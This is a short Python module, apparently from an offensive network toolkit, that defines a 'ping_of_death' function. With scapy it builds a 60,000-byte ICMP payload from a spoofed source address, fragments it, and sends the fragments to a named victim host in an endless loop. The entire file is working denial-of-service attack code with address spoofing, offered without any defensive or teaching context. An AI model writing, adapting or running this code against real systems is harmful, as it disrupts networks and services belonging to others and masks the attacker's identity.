from scapy.all import *
from func.spoof_addr import spoof_addr
from time import sleep

def ping_of_death(victim,quiet):
    spoofaddr = spoof_addr()
    packet = fragment(IP(src=spoofaddr,dst=victim)/ICMP()/("w"*60000))


    print("[+] Sending malformed ICMP packets to "+victim)

    while True:
        for p in packet:
            send(p,verbose=0)
            if not quiet:
                print("[+] Packet Sent // "+p.summary())
        sleep(2)
